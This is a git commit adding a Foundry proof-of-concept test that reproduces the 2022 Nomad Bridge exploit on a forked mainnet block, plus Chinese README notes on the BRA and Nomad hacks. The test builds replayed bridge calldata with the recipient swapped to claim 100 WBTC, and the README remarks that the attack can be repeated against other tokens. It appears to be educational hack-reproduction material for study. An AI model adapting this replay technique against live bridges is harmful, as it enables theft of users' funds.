4954f18274131982e9dc04ac11c76d5bec48972d
DeFan <2793791408@qq.com>
2023-07-16 17:31:12 +0800

    Add NomadBridge Hack

--- README.md
+++ README.md
@@ -6,8 +6,21 @@
 
 [BRA.exp.sol](./test/BRA.exp.sol)
 
-`forge test -contract ./test/BRA.exp.sol -vvv`
+`forge test --match-path ./test/BRA.exp.sol -vvv`
 
-漏洞: 漏洞发生在 BRA 代币的本身上,在 BRA 代币的合约实现逻辑上,其 **\_transfer()** 函数针对代币对交易收取 tax,但是没有加上 sync,可以满足两个 if 条件判断,导致可以收取两次 tax,使得代币增发。
+[Phalcon View](https://explorer.phalcon.xyz/tx/bsc/0x4e5b2efa90c62f2b62925ebd7c10c953dc73c710ef06695eac3f36fe0f6b9348)
+
+**漏洞**: 漏洞发生在 BRA 代币的本身上,在 BRA 代币的合约实现逻辑上,其 **\_transfer()** 函数针对代币对交易收取 tax,但是没有加上 sync,可以满足两个 if 条件判断,导致可以收取两次 tax,使得代币增发。
 
 ![BRA-_transfer()_BUG](images/BRA_BUG.jpeg)
+
+## 2022-08-01 NomadBridge
+
+[NomadBridge.exp.sol](./test/NomadBridge.exp.sol)
+
+`forge test --match-path ./test/NomadBridge.exp.sol -vvv`
+
+Nomad Bridge 跨链桥攻击算得上是 2022 年的最大 Web3 攻击事件了,涉及 1.52 亿 $,这金额也是天文数字了,虽然攻击需要对跨链桥技术和默尔克树在其中验证的作用有一定的理解,但攻击实现的代码不长,甚至 gas 费都没花多少,却可以用 0.01 个 WBTC 套 100 个 WBTC.
+不止这复现的第一轮合约,往后还有很多次攻击,只要换个目标代币去攻击,或者换一个验证信息(InputData)重复攻击 WBTC 都可以.
+
+[具体分析](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/07_Analysis_nomad_bridge/)
---
+++ test/NomadBridge.exp.sol
@@ -0,0 +1,112 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.10;
+
+import "forge-std/Test.sol";
+import "./interface.sol";
+
+// @KeyInfo - Total Lost : ~152M US$
+// Attacker(s) : 🦊🐸🐹😈🐵🤷‍♂️
+// Replica contract mistakenly initialize : 0x53fd92771d2084a9bf39a6477015ef53b7f116c79d98a21be723d06d79024cad
+// Example TXs in this reproduce
+//  Attacker send 0.01 WBTC to NomadBridge : 0xed26708a7335116bdb0673f32ace7c2f329fe3cd349e200447210f1721f335f0
+//  NomadBridge Process 100 WBTC to Attacker : 0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460
+
+// @Info
+// Nomad BridgeRouter Contract : https://etherscan.io/address/0x88a69b4e698a4b090df6cf5bd7b2d47325ad30a3#code (Proxy)
+// Nomad BridgeRouter Contract : https://etherscan.io/address/0x15fda9f60310d09fea54e3c99d1197dff5107248#code (Logic (At that time!))
+//                               https://etherscan.io/address/0xe0db61ac718f502B485DEc66D013afbbE0B52F84#code (Logic (Currently!))
+// Nomad Replica Contract : https://etherscan.io/address/0x5d94309e5a0090b165fa4181519701637b6daeba#code (Proxy)
+// Nomad Replica Contract : https://etherscan.io/address/0xb92336759618f55bd0f8313bd843604592e27bd8#code (Logic) (Vulnerable!!)
+// WBTC Contract : https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599#code
+// NomadBridge Audit Report : https://github.com/nomad-xyz/docs/blob/1ff0c55dba2a842c811468c57793ff9a6542ef0f/docs/public/Nomad-Audit.pdf (QSP-19 Proving With An Empty Leaf)
+
+// @Analysis
+// samczsun : https://twitter.com/samczsun/status/1554252024723546112
+// ParadigmEng420 : https://twitter.com/paradigmeng420/status/1554249610574450688
+// 0xfoobar : https://twitter.com/0xfoobar/status/1554269062653411334
+// CertiK : https://twitter.com/CertiKAlert/status/1554305088037978113
+// Beosin : https://twitter.com/BeosinAlert/status/1554303803218083842
+// Blocksec : https://twitter.com/BlockSecTeam/status/1554335271964987395
+// CertiK post-mortem : https://www.certik.com/resources/blog/28fMavD63CpZJOKOjb9DX3-nomad-bridge-exploit-incident-analysis
+
+contract Attacker is Test {
+    // 以太坊侧链Gnosisi上一地址: https://gnosisscan.io/address/0x7109709ECfa91a80626fF3989D68f67F5b1DD12D
+    CheatCodes constant cheat =
+        CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    // Nomad ERC20代币桥合约(也是跨链代币锁仓位置)
+    IReplica constant Replica =
+        IReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA);
+    IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
+
+    function setUp() public {
+        // 回到攻击发生前一个区块
+        cheat.createSelectFork("mainnet", 15259100);
+        // 标记这两代币地址
+        cheat.label(address(Replica), "Replica");
+        cheat.label(address(WBTC), "WBTC");
+    }
+
+    // 发起攻击
+    function testExploit() public {
+        console.log(
+            "Attackers can copy the original user's transaction calldata and replacing the receive address with a personal one."
+        );
+        console.log(
+            "We mock how attackers/whitehats replay the calldata at block 15259100\n"
+        );
+
+        // 记录攻击前Attacker的WBTC余额
+        emit log_named_decimal_uint(
+            "Attacker WBTC Balance",
+            WBTC.balanceOf(address(this)),
+            8
+        );
+        console.log("Attacker claim 100 WBTC from NomadBridge...");
+
+        // 那次攻击中链桥返回来100WBTC的交易哈希 Txhash : https://etherscan.io/tx/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460
+        // 复制了txhash(0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460)当时传入的消息数据,但将接受代币的地址换为自己的了
+        bytes
+            memory msgP1 = hex"6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000";
+        bytes memory recvAddr = abi.encodePacked(address(this));
+        bytes
+            memory msgP2 = hex"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a";
+        bytes memory _message = bytes.concat(msgP1, recvAddr, msgP2);
+
+        // This is _message data structure :
+        /*
+            bytes memory chainId = "beam";   // hex(6265616d) == dec(1650811245), Ref: https://docs.nomad.xyz/developers/environments/domain-chain-ids
+            bytes memory sender = hex"D3dfD3eDe74E0DCEBC1AA685e151332857efCe2d";
+            bytes memory nonce = hex"13d6";         // == dec"5078"
+            bytes memory localDomain = hex"657468"; // == str"eth"
+            bytes memory recipientAddress = hex"88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3";    // BridgeRouter address. this will callback BridgeRouter.handle(_message)
+             ------------ __message that call BridgeRouter.handle(__message) ------------
+            uint32 _domain = 657468;    // == str("eth")
+            bytes32 _id = abi.encodePacked(address(WBTC));
+            bytes32 _to = abi.encodePacked(address(this));
+            uint256 _amnt = 100 * 1e8; // 100 WBTC
+            bytes32 _detailsHash = keccak256(abi.encodePacked(bytes("Wrapped BTC").length, "Wrapped BTC", bytes("WBTC").length, "WBTC", uint8(8)));        
+            bytes29 _tokenId = BridgeMessage.formatTokenId(_domain, _id);
+            bytes29 _action = BridgeMessage.formatTransfer(_to, _amnt, _detailsHash);
+            bytes memory __message = BridgeMessage.formatMessage(_tokenId, _action);
+            -----------------------------------------------------------------------------
+            bytes memory _message = bytes.concat(chainId, sender, nonce, localDomain, recipientAddress, __message);
+        */
+
+        bool success = Replica.process(_message);
+        // 判断攻击是否成功
+        require(success, "Exploit failed");
+
+        // 记录攻击后Attacker的WBTC余额
+        emit log_named_decimal_uint(
+            "Attacker WBTC Balance",
+            WBTC.balanceOf(address(this)),
+            8
+        );
+    }
+}
+
+/*---------------- Interface ----------------*/
+
+interface IReplica {
+    function process(bytes memory _message) external returns (bool _success);
+}
